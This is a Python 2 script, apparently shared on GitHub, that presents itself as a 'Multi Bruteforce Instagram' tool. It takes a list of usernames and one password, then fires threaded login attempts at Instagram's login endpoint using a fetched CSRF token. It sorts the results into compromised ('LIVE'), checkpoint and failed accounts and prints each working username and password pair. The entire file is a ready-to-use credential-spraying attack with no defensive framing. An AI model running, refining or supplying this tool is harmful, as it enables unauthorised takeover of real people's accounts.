from requests import post,Session,get
import threading
import sys
import time
import re
W = '\033[1;37m' 
N = '\033[0m'
R = '\033[1;37m\033[31m'
B = '\033[1;37m\033[34m' 
G = '\033[1;32m'
O = '\033[33m'
notice  = "{}{}[*]{} ".format(N,B,N)
warning = "{}[-]{} ".format(R,N)
good    = "{}[!]{} ".format(G,N)
warn    = "{}[!]{} ".format(O,N)
threads=[]
live=[]
die=[]
checkpoint=[]
print '''{}
     .        :   :::::::.  ::: 
     ;;,.    ;;;   ;;;'';;' ;;;
     [[[[, ,[[[[,  [[[__[[\.[[[
     $$$$$$$$"$$$  $$""""Y$$$$${} Multi Bruteforce Instagram{}
     888 Y88" 888o_88o,,od8P888{} Bug? Fb : Deray{}
     MMM  M'  "MMM""YUMMMP" MMM {}github  : LOoLzeC{}
        __    __    __    __
       /  \  /  \  /  \  /  \\
______/  __\/  __\/  __\/  __\_____________________________
___________/  /__/  /__/  /__/ ____________________________
      | / \   / \   / \   / \  \____
      |/   \_/   \_/   \_/   \    o \\ {}By Deray{}
                              \_____/--<{}'''.format(B,O,B,O,B,O,R,G,R,N)
                              
class bruteforce(threading.Thread):
	def __init__(self,username,pswd):
		threading.Thread.__init__(self)
		self.hser=username
		self.pwds=pswd
	def run(self):
		req=Session()
		req.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		req.headers.update({'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36','x-instagram-ajax':'1','X-Requested-With': 'XMLHttpRequest','origin': 'https://www.instagram.com','ContentType' : 'application/x-www-form-urlencoded','Connection': 'keep-alive','Accept': '*/*','Referer': 'https://www.instagram.com','authority': 'www.instagram.com','Host' : 'www.instagram.com','Accept-Language' : 'en-US;q=0.6,en;q=0.4','Accept-Encoding' : 'gzip, deflate'})
		try:
			rsite = req.get('https://www.instagram.com/') 
			req.headers.update({'X-CSRFToken' : rsite.cookies.get_dict()['csrftoken']})
		except:pass 
		try:
			rsite = req.post(
			'https://www.instagram.com/accounts/login/ajax/',
			 data={'username':self.hser, 'password':self.pwds},
			 allow_redirects=True)
			req.headers.update({
			'X-CSRFToken' : req.cookies.get_dict()['csrftoken']})
		except:pass
		try:
			if (rsite.json()["authenticated"] ==True):
				live.append(self.hser)
			else:
				if (len(re.findall("checkpoint",rsite.text)) !=0):
					checkpoint.append(self.hser)
				else:
					die.append(self.hser)
		except:pass

# Preparing to Crack
def prepare():
	global threads
	cout=0
	cou2=0
	try:
		file=raw_input("\n\n%sUsername List   :"%(warn))
		usname=open(file).read().splitlines()
		password=raw_input("%sPassword to crack :"%(warn))
		if (password is ""):
			print("{}none passwords"%(warning))
			exit()
		for x in usname:
			t = bruteforce(x,password)
			threads.append(t)
		for t in threads:
			try:
				cout+=1
				print("\r{}Preparing {} of {} wordlists ...".format(warn,cout,len(usname))),;sys.stdout.flush()
				t.start()
			except:
				pass
		for t in threads:
			cou2+=1
			print("\r{}Cracking {} account with passwords {} {}".format(good,len(usname),password,cou2)),;sys.stdout.flush()
			t.join()
		print "\n%sLIVE %s"%(good,len(live))
		for x in live:
			print("  {}# {} ==> {} {}".format(G,x,password,N))
		print "%sDIEE %s"%(warn,len(die))
		print "%sCHECKPOINT %s"%(warn,len(checkpoint))
		for x in checkpoint:
			print("  {}# {} ==> {} {}".format(O,x,password,N))
	except Exception as f:
		pass
		
if __name__ == "__main__":
	prepare()
